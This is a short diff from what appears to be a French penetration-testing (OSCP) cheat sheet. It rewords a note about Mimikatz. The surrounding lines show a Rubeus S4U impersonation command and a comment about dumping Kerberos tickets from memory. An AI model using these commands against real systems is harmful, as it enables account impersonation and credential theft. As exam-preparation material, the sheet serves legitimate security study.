@@ -1178,7 +1178,7 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 
 ```
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 # Extraire les tickets Kerberos de la mémoire avec Mimikatz
